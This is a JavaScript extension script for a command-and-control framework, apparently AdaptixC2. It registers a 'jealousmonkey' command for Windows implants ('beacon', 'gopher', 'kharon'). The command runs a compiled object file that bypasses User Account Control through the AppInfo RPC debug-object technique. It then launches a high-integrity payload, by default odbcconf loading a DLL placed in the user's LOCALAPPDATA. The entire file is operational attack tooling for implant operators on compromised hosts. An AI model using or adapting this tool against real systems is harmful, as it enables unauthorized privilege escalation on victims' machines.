var metadata = {
    name: "JealousMonkey",
    description: "AppInfo Method 59 UAC bypass (debug object) — fileless elevation to high-integrity child"
};

var cmd_jealousmonkey = ax.create_command(
    "jealousmonkey",
    "Bypass UAC via AppInfo RPC and spawn high-integrity payload (default: odbcconf REGSVR + CloudStore Shell.dll)",
    "jealousmonkey"
);
cmd_jealousmonkey.addArgString("payload", false, "Optional full command line (default uses %LOCALAPPDATA%\\...\\Windows.CloudStore.Schema.Shell.dll)");

cmd_jealousmonkey.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let marker = "jealousmonkey";
    let idx = cmdline.toLowerCase().indexOf(marker);
    if (idx < 0) { throw new Error("Invalid command"); }

    let rest = cmdline.substring(idx + marker.length).trim();
    let payload = "";
    if ("payload" in parsed_json && parsed_json["payload"]) {
        payload = parsed_json["payload"];
    } else if (rest.length > 0) {
        payload = rest;
    }

    let bof_params = ax.bof_pack("wstr", [payload]);
    let bof_path = ax.script_dir() + "_bin/jealousmonkey." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "JEALOUSMONKEY UAC bypass");
});

var group_jealousmonkey = ax.create_commands_group("JealousMonkey", [cmd_jealousmonkey]);
ax.register_commands_group(group_jealousmonkey, ["beacon", "gopher", "kharon"], ["windows"], []);
